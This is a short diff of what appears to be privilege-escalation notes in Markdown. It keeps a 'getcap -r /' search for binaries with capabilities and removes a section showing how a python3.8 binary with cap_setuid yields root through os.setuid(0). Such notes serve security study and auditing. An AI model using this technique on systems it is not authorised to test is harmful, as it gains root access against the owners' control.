@@ -13,19 +13,3 @@
 ```bash
 getcap -r / 2>/dev/null
 ```
-
----
-
-## Exploit Python `cap_setuid` Capability
-
-```bash
-$ getcap -r / 2>/dev/null
-...
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-...
-
-$ python3.8
->>> import os
->>> os.setuid(0)
->>> # do things
-```
